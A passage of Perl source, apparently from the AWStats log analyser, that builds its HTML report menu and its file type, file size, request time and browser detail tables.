				print( $frame? "</td></tr>\n" : " &nbsp; " );
			}
			if ( $ShowPagesStats =~ /X/i ) {
				print( $frame
					? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
					: ""
				);
				print "<a href=\""
				  . (
					$ENV{'GATEWAY_INTERFACE'}
					  || !$StaticLinks
					? XMLEncode("$AWScript${NewLinkParams}output=urlexit")
					: "$StaticLinks.urlexit.$StaticExt"
				  )
				  . "\"$NewLinkTarget>" . _t("Exit") . "</a>\n";
				print( $frame? "</td></tr>\n" : " &nbsp; " );
			}
			if ($ShowOSStats) {
				print( $frame? "<tr><td class=\"awsm\">" : "" );
				print
				  "<a href=\"$linkanchor#os\"$targetpage>" . _t("Operating Systems") . "</a>";
				print( $frame? "</td></tr>\n" : " &nbsp; " );
			}
			if ($ShowOSStats) {
				print( $frame
					? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
					: ""
				);
				print "<a href=\""
				  . (
					$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
					? XMLEncode(
						"$AWScript${NewLinkParams}output=osdetail")
					: "$StaticLinks.osdetail.$StaticExt"
				  )
				  . "\"$NewLinkTarget>" . _t("Detailed") . "</a>\n";
				print( $frame? "</td></tr>\n" : " &nbsp; " );
			}
			if ($ShowOSStats) {
				print( $frame
					? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
					: ""
				);
				print "<a href=\""
				  . (
					$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
					? XMLEncode(
						"$AWScript${NewLinkParams}output=unknownos")
					: "$StaticLinks.unknownos.$StaticExt"
				  )
				  . "\"$NewLinkTarget>" . _t("unknownos") . "</a>\n";
				print( $frame? "</td></tr>\n" : " &nbsp; " );
			}
			if ($ShowBrowsersStats) {
				print( $frame? "<tr><td class=\"awsm\">" : "" );
				print
"<a href=\"$linkanchor#browsers\"$targetpage>" . _t("Browsers") . "</a>";
				print( $frame? "</td></tr>\n" : " &nbsp; " );
			}
			if ($ShowBrowsersStats) {
				print( $frame
					? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
					: ""
				);
				print "<a href=\""
				  . (
					$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
					? XMLEncode(
						"$AWScript${NewLinkParams}output=browserdetail")
					: "$StaticLinks.browserdetail.$StaticExt"
				  )
				  . "\"$NewLinkTarget>" . _t("Detailed") . "</a>\n";
				print( $frame? "</td></tr>\n" : " &nbsp; " );
			}
			if ($ShowBrowsersStats) {
				print( $frame
					? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
					: ""
				);
				print "<a href=\""
				  . (
					$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
					? XMLEncode(
						"$AWScript${NewLinkParams}output=unknownbrowser")
					: "$StaticLinks.unknownbrowser.$StaticExt"
				  )
				  . "\"$NewLinkTarget>" . _t("unknownbrowser") . "</a>\n";
				print( $frame? "</td></tr>\n" : " &nbsp; " );
			}
			if ($ShowScreenSizeStats) {
				print( $frame? "<tr><td class=\"awsm\">" : "" );
				print
"<a href=\"$linkanchor#screensizes\"$targetpage>" . _t("Screen sizes") . "</a>";
				print( $frame? "</td></tr>\n" : " &nbsp; " );
			}
			if ($linetitle) { print( $frame? "" : "</td></tr>\n" ); }

			# Referers
			%menu = (
				'referer'      => $ShowOriginStats ? 1 : 0,
				'refererse'    => $ShowOriginStats ? 2 : 0,
				'refererpages' => $ShowOriginStats ? 3 : 0,
				'keys' => ( $ShowKeyphrasesStats || $ShowKeywordsStats )
				? 4
				: 0,
				'keyphrases' => $ShowKeyphrasesStats ? 5 : 0,
				'keywords'   => $ShowKeywordsStats   ? 6 : 0
			);
			%menulink = (
				'referer'      => 1,
				'refererse'    => 2,
				'refererpages' => 2,
				'keys'         => 1,
				'keyphrases'   => 2,
				'keywords'     => 2
			);
			%menutext = (
				'referer'      => _t("Origin"),
				'refererse'    => _t("Search Engines"),
				'refererpages' => _t("External pages"),
				'keys'         => _t("Keyphrases/Keywords"),
				'keyphrases'   => _t("Keyphrases"),
				'keywords'     => _t("Keywords")
			);
			HTMLShowMenuCateg(
				'referers',     _t("Referers"),
				'menu7.png',    $frame,
				$targetpage,    $linkanchor,
				$NewLinkParams, $NewLinkTarget,
				\%menu,         \%menulink,
				\%menutext
			);

			# Others
			%menu = (
				'filetypes' => ( $ShowFileTypesStats =~ /C/i ) ? 1 : 0,
				'misc' => $ShowMiscStats ? 2 : 0,
				'errors' => ( $ShowHTTPErrorsStats || $ShowSMTPErrorsStats )
				? 3
				: 0,
				'clusters' => $ShowClusterStats ? 5 : 0
			);
			%menulink = (
				'filetypes' => 1,
				'misc'      => 1,
				'errors'    => 1,
				'clusters'  => 1
			);
			%menutext = (
				'filetypes' => _t("Compression"),
				'misc'      => _t("Misc"),
				'errors'    =>
				  ( $ShowSMTPErrorsStats ? _t("SMTP Error codes") : _t("HTTP Error codes") ),
				'clusters' => _t("Clusters")
			);
			my $idx = 0;
			foreach ( sort keys %TrapInfosForHTTPErrorCodes ) {
				$menu{"errors$_"}     = $ShowHTTPErrorsStats ? 4+$idx : 0;
				$menulink{"errors$_"} = 2;
				$menutext{"errors$_"} = _t("Page detail") . ' (' . $_ . ')';
				$idx++;
			}
			HTMLShowMenuCateg(
				'others',       _t("Others"),
				'menu8.png',    $frame,
				$targetpage,    $linkanchor,
				$NewLinkParams, $NewLinkTarget,
				\%menu,         \%menulink,
				\%menutext
			);

			# Extra/Marketing
			%menu     = ();
			%menulink = ();
			%menutext = ();
			my $i = 1;
			foreach ( 1 .. @ExtraName - 1 ) {
				$menu{"extra$_"}        = $i++;
				$menulink{"extra$_"}    = 1;
				$menutext{"extra$_"}    = $ExtraName[$_];
				$menu{"allextra$_"}     = $i++;
				$menulink{"allextra$_"} = 2;
				$menutext{"allextra$_"} = _t("Full list");
			}
			HTMLShowMenuCateg(
				'extra',        _t("Extra/Marketing"),
				'',             $frame,
				$targetpage,    $linkanchor,
				$NewLinkParams, $NewLinkTarget,
				\%menu,         \%menulink,
				\%menutext
			);
			print "</table>\n";
		}
		else {

			# Menu Applet
			if ($frame) { }
			else { }
		}

		#print ($frame?"":"<br />\n");
		print "<br />\n";
	}

	# Print Back link
	elsif ( !$HTMLOutput{'main'} ) {
		print "<table>\n";
		$NewLinkParams =~ s/(^|&|&amp;)hostfilter=[^&]*//i;
		$NewLinkParams =~ s/(^|&|&amp;)urlfilter=[^&]*//i;
		$NewLinkParams =~ s/(^|&|&amp;)refererpagesfilter=[^&]*//i;
		$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
		$NewLinkParams =~ s/^&amp;//;
		$NewLinkParams =~ s/&amp;$//;
		if (   !$DetailedReportsOnNewWindows
			|| $FrameName eq 'mainright'
			|| $QueryString =~ /buildpdf/i )
		{
			print "<tr><td class=\"aws\"><a href=\""
			  . (
				$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
				? XMLEncode("$AWScript${NewLinkParams}")
				: "$StaticLinks.$StaticExt"
			  )
			  . "\">" . _t("Back to main page") . "</a></td></tr>\n";
		}
		else {
			print "<tr><td class=\"aws\">";
			print "<a href=\"javascript:if(window.parent && window.parent != window)window.parent.close(); else if(window.opener)window.close(); else history.back();\">" 
				. _t("Close window") . "</a>";
			print " | <a href=\"" 
        . ( $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
            ? "/stats/"
            : "/stats/" )
        . "\">" . _t("Back page") . "</a>";
			print "</td></tr>\n";
		}
		print "</table>\n";
		print "\n";
	}
}

#------------------------------------------------------------------------------
# Function:     Prints the File Type table
# Parameters:   _
# Input:        $NewLinkParams, $NewLinkTargets
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainFileType{
    my $NewLinkParams = shift;
    my $NewLinkTarget = shift;
	if (!$LevelForFileTypesDetection > 0){return;}
	if ($Debug) { debug( "ShowFileTypesStatsCompressionStats", 2 ); }
	print "$Center<a name=\"filetypes\">&nbsp;</a><br />\n";
	my $Totalh = 0;
	foreach ( keys %_filetypes_h ) { $Totalh += $_filetypes_h{$_}; }
	my $Totalk = 0;
	foreach ( keys %_filetypes_k ) { $Totalk += $_filetypes_k{$_}; }
	my $title = _t("File type");
    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        # extend the title to include the added link 
        $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
           "$AddLinkToExternalCGIWrapper" . "?section=FILETYPES&baseName=$DirData/$PROG"
           . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
           . "&siteConfig=$SiteConfig" )
           . "\"$NewLinkTarget>" . _t("Export") . "</a>");
    } 

	if ( $ShowFileTypesStats =~ /C/i ) { $title .= " - " . _t("Compression"); }
	
	# build keylist at top
	&BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_filetypes_h,
		\%_filetypes_h );
		
	&tab_head( "$title", 19, 0, 'filetypes' );
		
	# Graph the top five in a pie chart
	if (scalar @keylist > 1){
		foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
		{
			my @blocklabel = ();
			my @valdata = ();
			my @valcolor = ($color_p);
			my $cnt = 0;
			foreach my $key (@keylist) {
				push @valdata, int( $_filetypes_h{$key} / $Totalh * 1000 ) / 10;
				push @blocklabel, "$key";
				$cnt++;
				if ($cnt > 4) { last; }
			}
			print "<tr><td colspan=\"7\">";
			my $function = "ShowGraph_$pluginname";
			&$function(
				_t("File type"),              "filetypes",
				0, 						\@blocklabel,
				0,           			\@valcolor,
				0,              		0,
				0,          			\@valdata
			);
			print "</td></tr>";
		}
	}
	
	print
"<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"3\">" . _t("File type") . "</th>";

	if ( $ShowFileTypesStats =~ /H/i ) {
		print "<th bgcolor=\"#$color_h\" width=\"80\""
		  . Tooltip(4)
		  . ">" . _t("Hits") . "</th><th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th>";
	}
	if ( $ShowFileTypesStats =~ /B/i ) {
		print "<th bgcolor=\"#$color_k\" width=\"80\""
		  . Tooltip(5)
		  . ">" . _t("Bandwidth") . "</th><th bgcolor=\"#$color_k\" width=\"80\">" . _t("Percent") . "</th>";
	}
	if ( $ShowFileTypesStats =~ /C/i ) {
		print
"<th bgcolor=\"#$color_k\" width=\"100\">" . _t("In") . "</th><th bgcolor=\"#$color_k\" width=\"100\">" . _t("Out") . "</th><th bgcolor=\"#$color_k\" width=\"100\">" . _t("Saved") . "</th>";
	}
	print "</tr>\n";
	my $total_con = 0;
	my $total_cre = 0;
	my $count     = 0;
	foreach my $key (@keylist) {
		my $p_h = '&nbsp;';
		my $p_k = '&nbsp;';
		if ($Totalh) {
			$p_h = int( $_filetypes_h{$key} / $Totalh * 1000 ) / 10;
			$p_h = "$p_h %";
		}
		if ($Totalk) {
			$p_k = int( $_filetypes_k{$key} / $Totalk * 1000 ) / 10;
			$p_k = "$p_k %";
		}
		if ( $key eq 'Unknown' ) {
			print "<tr><td"
			  . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
			  . "><img src=\"$DirIcons\/mime\/unknown.png\""
			  . AltTitle("")
			  . " /></td><td class=\"aws\" colspan=\"2\"><span style=\"color: #$color_other\">" . _t("Unknown") . "</span></td>";
		}
		else {
			my $nameicon = $MimeHashLib{$key}[0] || "notavailable";
			my $nametype = $MimeHashFamily{$MimeHashLib{$key}[0]} || "&nbsp;";
			print "<tr><td"
			  . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
			  . "><img src=\"$DirIcons\/mime\/$nameicon.png\""
			  . AltTitle("")
			  . " /></td><td class=\"aws\">$key</td>";
			print "<td class=\"aws\">$nametype</td>";
		}
		if ( $ShowFileTypesStats =~ /H/i ) {
			print "<td>".Format_Number($_filetypes_h{$key})."</td><td>$p_h</td>";
		}
		if ( $ShowFileTypesStats =~ /B/i ) {
			print '<td nowrap="nowrap">'
			  . Format_Bytes( $_filetypes_k{$key} )
			  . "</td><td>$p_k</td>";
		}
		if ( $ShowFileTypesStats =~ /C/i ) {
			if ( $_filetypes_gz_in{$key} ) {
				my $percent = int(
					100 * (
						1 - $_filetypes_gz_out{$key} /
						  $_filetypes_gz_in{$key}
					)
				);
				printf(
					"<td>%s</td><td>%s</td><td>%s (%s%)</td>",
					Format_Bytes( $_filetypes_gz_in{$key} ),
					Format_Bytes( $_filetypes_gz_out{$key} ),
					Format_Bytes(
						$_filetypes_gz_in{$key} -
						  $_filetypes_gz_out{$key}
					),
					$percent
				);
				$total_con += $_filetypes_gz_in{$key};
				$total_cre += $_filetypes_gz_out{$key};
			}
			else {
				print "<td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td>";
			}
		}
		print "</tr>\n";
		$count++;
	}

	# Add total (only useful if compression is enabled)
	if ( $ShowFileTypesStats =~ /C/i ) {
		my $colspan = 3;
		if ( $ShowFileTypesStats =~ /H/i ) { $colspan += 2; }
		if ( $ShowFileTypesStats =~ /B/i ) { $colspan += 2; }
		print "<tr>";
		print
"<td class=\"aws\" colspan=\"$colspan\"><b>" . _t("Compression") . "</b></td>";
		if ( $ShowFileTypesStats =~ /C/i ) {
			if ($total_con) {
				my $percent =
				  int( 100 * ( 1 - $total_cre / $total_con ) );
				printf(
					"<td>%s</td><td>%s</td><td>%s (%s%)</td>",
					Format_Bytes($total_con),
					Format_Bytes($total_cre),
					Format_Bytes( $total_con - $total_cre ),
					$percent
				);
			}
			else {
				print "<td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td>";
			}
		}
		print "</tr>\n";
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the File Size Table
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainFileSize{
        if ($Debug) { debug("ShowFileSizesStats",2); }
        my $FirstTime = 0;
        my $LastTime  = 0;
        foreach my $key ( keys %FirstTime ) {
                my $keyqualified = 0;
                if ( $MonthRequired eq 'all' ) { $keyqualified = 1; }
                if ( $key =~ /^$YearRequired$MonthRequired/ ) { $keyqualified = 1; }
                if ($keyqualified) {
                        if ( $FirstTime{$key}
                                && ( $FirstTime == 0 || $FirstTime > $FirstTime{$key} ) )
                        {
                                $FirstTime = $FirstTime{$key};
                        }
                        if ( $LastTime < ( $LastTime{$key} || 0 ) ) {
                                $LastTime = $LastTime{$key};
                        }
                }
        }

        my $inicio = 0;
        my $fim = 0;
        if ($FirstTime =~ /$regdate/o) { $inicio = Time::Local::timelocal($6, $5, $4, $3, $2-1, $1); }
        if ($LastTime =~ /$regdate/o) { $fim = Time::Local::timelocal($6, $5, $4, $3, $2-1, $1); }
        my $periodo = $fim - $inicio;
        my $number_of_requests = 0;
        my $request_frequency_average = 0;
        foreach my $key (@PayloadRange) {
                $number_of_requests += $_filesize{$key};
        }
        if ($periodo) { $request_frequency_average = $number_of_requests/$periodo;}
        else { $request_frequency_average = 0 };
        print "$Center<a name=\"filesizes\">&nbsp;</a><br />\n";
        my $title = _t("File size");
        &tab_head($title, 19, 0, 'filesizes');
        my $Totals = 0;
        my $average_s = 0;
        foreach (@PayloadRange) {
                $average_s += ( $_filesize{$_} || 0 ) * $PayloadAverage{$_};
                $Totals += $_filesize{$_} || 0;
        }
        if ($Totals) { $average_s = int($average_s / $Totals); }
        else { $average_s = '?'; }
        print "<tr bgcolor=\"#$color_TableBGRowTitle\"".Tooltip(1)."><th>" . _t("Total requests") . ": $number_of_requests - " . _t("Period") . ": $periodo " . _t("Seconds") . " - " . _t("Average frequency") . ": ".sprintf ("%.6f",$request_frequency_average)."</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Frequency") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Percent") . "</th></tr>\n";
        my $total_s = 0;
        my $count = 0;
        foreach my $key (@PayloadRange) {
                my $p = 0;
                my $f = 0;
                if ($Totals) { $p = int($_filesize{$key} / $Totals * 1000) / 10; }
                if ($periodo) { $f = $_filesize{$key} / $periodo; }
                $total_s += $_filesize{$key} || 0;
                print "<tr><td class=\"aws\">$key</td>";
                print "<td>".($_filesize{$key}? sprintf("%.5f",$f):"&nbsp;")."</td>";
                print "<td>".($_filesize{$key}? $_filesize{$key}:"&nbsp;")."</td>";
                print "<td>".($_filesize{$key}? "$p %":"&nbsp;")."</td>";
                print "</tr>\n";
                $count++;
        }
        my $rest_s = $TotalVisits-$total_s;
        if ($rest_s > 0) {
                my $p = 0;
                if ($TotalVisits) { $p = int($rest_s / $TotalVisits * 1000) / 10; }
                print "<tr".Tooltip(20)."><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Unknown") . "</span></td>";
                print "<td>$rest_s</td>";
                print "<td>".($rest_s?"$p %":"&nbsp;")."</td>";
                print "</tr>\n";
        }

        &tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints Request Time table
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainRequestTime{
        if ($Debug) { debug("ShowRequestTimesStats", 2); }
        my $FirstTime = 0;
        my $LastTime  = 0;
        foreach my $key ( keys %FirstTime ) {
                my $keyqualified = 0;
                if ( $MonthRequired eq 'all' ) { $keyqualified = 1; }
                if ( $key =~ /^$YearRequired$MonthRequired/ ) { $keyqualified = 1; }
                if ($keyqualified) {
                        if ( $FirstTime{$key}
                                && ( $FirstTime == 0 || $FirstTime > $FirstTime{$key} ) )
                        {
                                $FirstTime = $FirstTime{$key};
                        }
                        if ( $LastTime < ( $LastTime{$key} || 0 ) ) {
                                $LastTime = $LastTime{$key};
                        }
                }
        }

        my $inicio = 0;
        my $fim = 0;
        if ($FirstTime =~ /$regdate/o) { $inicio = Time::Local::timelocal($6,$5,$4,$3,$2-1,$1); }
        if ($LastTime =~ /$regdate/o) { $fim = Time::Local::timelocal($6,$5,$4,$3,$2-1,$1); }
        my $periodo = $fim - $inicio;
        my $number_of_requests = 0;
        my $request_frequency_average = 0;
        foreach my $key (@TimeRange) {
                $number_of_requests += $_requesttime{$key};
        }
        if ($periodo) { $request_frequency_average = $number_of_requests / $periodo;}
        else { $request_frequency_average = 0};
        print "$Center<a name=\"requesttimes\">&nbsp;</a><br />\n";
        my $title = _t("Request time");
        &tab_head($title, 19, 0, 'requesttimes');
        my $Totals = 0;
        my $average_s = 0;
        foreach (@TimeRange) {
                $average_s += ($_requesttime{$_} || 0) * $TimeAverage{$_};
                $Totals += $_requesttime{$_} || 0;
        }
        if ($Totals) { $average_s = int($average_s / $Totals); }
        else { $average_s = '?'; }
        print "<tr bgcolor=\"#$color_TableBGRowTitle\"".Tooltip(1)."><th>" . _t("Total requests") . ": $number_of_requests - " . _t("Period") . ": $periodo " . _t("Seconds") . " - " . _t("Average frequency") . ": ".sprintf ("%.6f",$request_frequency_average)."</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Frequency") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Percent") . "</th></tr>\n";
        my $total_s = 0;
        my $count = 0;
        foreach my $key (@TimeRange) {
                my $p = 0;
                my $f = 0;
                if ($Totals) { $p = int($_requesttime{$key} / $Totals * 1000) / 10; }
                if ($periodo) { $f = $_requesttime{$key} / $periodo; }
                $total_s += $_requesttime{$key} || 0;
                print "<tr><td class=\"aws\">$key</td>";
                print "<td>".($_requesttime{$key} ? sprintf("%.5f",$f) : "&nbsp;")."</td>";
                print "<td>".($_requesttime{$key} ? $_requesttime{$key} : "&nbsp;")."</td>";
                print "<td>".($_requesttime{$key} ? "$p %" : "&nbsp;")."</td>";
                print "</tr>\n";
                $count++;
        }
        my $rest_s = $TotalVisits - $total_s;
        if ($rest_s > 0) {
                my $p = 0;
                if ($TotalVisits) { $p = int($rest_s / $TotalVisits * 1000) / 10; }
                print "<tr".Tooltip(20)."><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Unknown") . "</span></td>";
                print "<td>$rest_s</td>";
                print "<td>".($rest_s?"$p %":"&nbsp;")."</td>";
                print "</tr>\n";
        }

        &tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the Browser Detail frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowBrowserDetail{
	# Show browsers versions
	print "$Center<a name=\"browsersversions\">&nbsp;</a><br />";
	my $title = _t("Browsers");
	&tab_head( "$title", 19, 0, 'browsersversions' );
	print
"<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"2\">" . _t("Detailed") . "</th>";
	print
"<th width=\"80\">" . _t("Unique visitors") . "</th><th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th><th bgcolor=\"#$color_p\" width=\"80\">" . _t("Percent") . "</th>";
	print
"<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th>";
	print "<th>&nbsp;</th>";
	print "</tr>\n";
	my $total_h = 0;
	my $total_p = 0;
	my $count = 0;
	&BuildKeyList( MinimumButNoZero( scalar keys %_browser_h, 500 ),
		1, \%_browser_h, \%_browser_p );
	my %keysinkeylist = ();
	my $max_h = 1;
	my $max_p = 1;

	# Count total by family
	my %totalfamily_h = ();
	my %totalfamily_p = ();
	my $TotalFamily_h = 0;
	my $TotalFamily_p = 0;
  BROWSERLOOP: foreach my $key (@keylist) {
		$total_h += $_browser_h{$key};
		if ( $_browser_h{$key} > $max_h ) {
			$max_h = $_browser_h{$key};
		}
		$total_p += $_browser_p{$key};
		if ( $_browser_p{$key} > $max_p ) {
			$max_p = $_browser_p{$key};
		}
		foreach my $family ( keys %BrowsersFamily ) {
			if ( $key =~ /^$family/i ) {
				$totalfamily_h{$family} += $_browser_h{$key};
				$totalfamily_p{$family} += $_browser_p{$key};
				$TotalFamily_h          += $_browser_h{$key};
				$TotalFamily_p          += $_browser_p{$key};
				next BROWSERLOOP;
			}
		}
	}

	# Write records grouped in a browser family
	foreach my $family (
		sort { $BrowsersFamily{$a} <=> $BrowsersFamily{$b} }
		keys %BrowsersFamily
	  )
	{
		my $p_h = '&nbsp;';
		my $p_p = '&nbsp;';
		if ($total_h) {
			$p_h = int( $totalfamily_h{$family} / $total_h * 1000 ) / 10;
			$p_h = "$p_h %";
		}
		if ($total_p) {
			$p_p = int( $totalfamily_p{$family} / $total_p * 1000 ) / 10;
			$p_p = "$p_p %";
		}
		my $familyheadershown = 0;

		#foreach my $key ( reverse sort keys %_browser_h ) {
		foreach my $key ( reverse sort SortBrowsers keys %_browser_h ) {
			if ( $key =~ /^$family(.*)/i ) {
				if ( !$familyheadershown ) {
					print
"<tr bgcolor=\"#F6F6F6\"><td class=\"aws\" colspan=\"2\"><b>"
				  . uc($family)
				  . "</b></td>";
				print "<td>&nbsp;</td><td><b>"
				  . Format_Number(int( $totalfamily_p{$family} ))
				  . "</b></td><td><b>$p_p</b></td>";
				print "<td><b>"
				  . Format_Number(int( $totalfamily_h{$family} ))
				  . "</b></td><td><b>$p_h</b></td><td>&nbsp;</td>";
				print "</tr>\n";
				$familyheadershown = 1;
			}
			$keysinkeylist{$key} = 1;
			my $ver = $1;
			my $p_h = '&nbsp;';
			my $p_p = '&nbsp;';
			if ($total_h) {
				$p_h = 
				  int( $_browser_h{$key} / $total_h * 1000 ) / 10;
				$p_h = "$p_h %";
			}
			if ($total_p) {
				$p_p =
				  int( $_browser_p{$key} / $total_p * 1000 ) / 10;
				$p_p = "$p_p %";
			}
			print "<tr>";
			print "<td"
			  . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
			  . "><img src=\"$DirIcons\/browser\/$family.png\""
			  . AltTitle("")
			  . " /></td>";
			print "<td class=\"aws\">"
			  . ucfirst($family) . " "
			  . ( $ver ? "$ver" : "?" ) . "</td>";
			print "<td>"
			  . (
				$BrowsersHereAreGrabbers{$family}
				? "<b>" . _t("Grabber") . "</b>"
				: _t("Pages")
			  )
			  . "</td>";
			my $bredde_h = 0;
			my $bredde_p = 0;
			if ( $max_h > 0 ) {
				$bredde_h =
				  int( $BarWidth * ( $_browser_h{$key} || 0 ) /
					  $max_h ) + 1;
			}
			if ( ( $bredde_h == 1 ) && $_browser_h{$key} ) {
				$bredde_h = 2;
			}
			if ( $max_p > 0 ) {
				$bredde_p =
				  int( $BarWidth * ( $_browser_p{$key} || 0 ) /
					  $max_p ) + 1;
			}
			if ( ( $bredde_p == 1 ) && $_browser_p{$key} ) {
				$bredde_p = 2;
			}
			print "<td>".Format_Number($_browser_p{$key})."</td><td>$p_p</td>";
			print "<td>".Format_Number($_browser_h{$key})."</td><td>$p_h</td>";
			print "<td class=\"aws\">";

			# alt and title are not provided to reduce page size
			if ($ShowBrowsersStats) {
				print
"<img src=\"$DirIcons\/other\/$BarPng{'hp'}\" width=\"$bredde_p\" height=\"5\" /><br />";
				print
"<img src=\"$DirIcons\/other\/$BarPng{'hh'}\" width=\"$bredde_h\" height=\"5\" /><br />";
				}
				print "</td>";
				print "</tr>\n";
				$count++;
			}
		}
	}

	# Write other records
	my $familyheadershown = 0;
	foreach my $key (@keylist) {
		if ( $keysinkeylist{$key} ) { next; }
		if ( !$familyheadershown )  {
			my $p_h = '&nbsp;';
			my $p_p = '&nbsp;';
			if ($total_p) {
				$p_p =
				  int( ( $total_p - $TotalFamily_p ) / $total_p * 1000 ) /
				  10;
				$p_p = "$p_p %";
			}
			if ($total_h) {
				$p_h =
				  int( ( $total_h - $TotalFamily_h ) / $total_h * 1000 ) /
				  10;
				$p_h = "$p_h %";
			}
			print
"<tr bgcolor=\"#F6F6F6\"><td class=\"aws\" colspan=\"2\"><b>" . _t("Others") . "</b></td>";
			print "<td>&nbsp;</td><td><b>"
			  . Format_Number(( $total_p - $TotalFamily_p ))
			  . "</b></td><td><b>$p_p</b></td>";
			print "<td><b>"
			  . Format_Number(( $total_h - $TotalFamily_h ))
			  . "</b></td><td><b>$p_h</b></td><td>&nbsp;</td>";
			print "</tr>\n";
			$familyheadershown = 1;
		}
		my $p_h = '&nbsp;';
		my $p_p = '&nbsp;';
		if ($total_h) {
			$p_h = int( $_browser_h{$key} / $total_h * 1000 ) / 10;
			$p_h = "$p_h %";
		}
		if ($total_p) {
			$p_p = int( $_browser_p{$key} / $total_p * 1000 ) / 10;
			$p_p = "$p_p %";
		}
		print "<tr>";
		if ( $key eq 'Unknown' ) {
			print "<td"
			  . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
			  . "><img src=\"$DirIcons\/browser\/unknown.png\""
			  . AltTitle("")
			  . " /></td><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Unknown") . "</span></td><td width=\"80\">?</td>";
		}
		else {
			my $keywithoutcumul = $key;
			$keywithoutcumul =~ s/cumul$//i;
			my $libbrowser = $BrowsersHashIDLib{$keywithoutcumul}
			  || $keywithoutcumul;
			my $nameicon = $BrowsersHashIcon{$keywithoutcumul}
			  || "notavailable";
			print "<td"
			  . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
			  . "><img src=\"$DirIcons\/browser\/$nameicon.png\""
			  . AltTitle("")
			  . " /></td><td class=\"aws\">$libbrowser</td><td>"
			  . (
				$BrowsersHereAreGrabbers{$key}
				? "<b>" . _t("Grabber") . "</b>"
				: _t("Pages")
			  )
			  . "</td>";
		}
		my $bredde_h = 0;
		my $bredde_p = 0;
		if ( $max_h > 0 ) {
			$bredde_h =
			  int( $BarWidth * ( $_browser_h{$key} || 0 ) / $max_h ) +
			  1;
		}
		if ( $max_p > 0 ) {
			$bredde_p =
			  int( $BarWidth * ( $_browser_p{$key} || 0 ) / $max_p ) +
			  1;
		}
		if ( ( $bredde_h == 1 ) && $_browser_h{$key} ) {
			$bredde_h = 2;
		}
		if ( ( $bredde_p == 1 ) && $_browser_p{$key} ) {
			$bredde_p = 2;
		}
		print "<td>".Format_Number($_browser_p{$key})."</td><td>$p_p</td>";
		print "<td>".Format_Number($_browser_h{$key})."</td><td>$p_h</td>";
		print "<td class=\"aws\">";

		# alt and title are not provided to reduce page size
		if ($ShowBrowsersStats) {
			print
"<img src=\"$DirIcons\/other\/$BarPng{'hp'}\" width=\"$bredde_p\" height=\"5\" /><br />";
			print
"<img src=\"$DirIcons\/other\/$BarPng{'hh'}\" width=\"$bredde_h\" height=\"5\" /><br />";
		}
		print "</td>";
		print "</tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Unknown Browser Detail frame or static page
# Parameters:   $NewLinkTarget
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowBrowserUnknown{
    my $NewLinkTarget = shift;
	print "$Center<a name=\"unknownbrowser\">&nbsp;</a><br />\n";
	my $title = _t("Unknown Browser");
    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
       # extend the title to include the added link 
           $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
               "$AddLinkToExternalCGIWrapper" . "?section=UNKNOWNREFERERBROWSER&baseName=$DirData/$PROG"
           . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
           . "&siteConfig=$SiteConfig" )
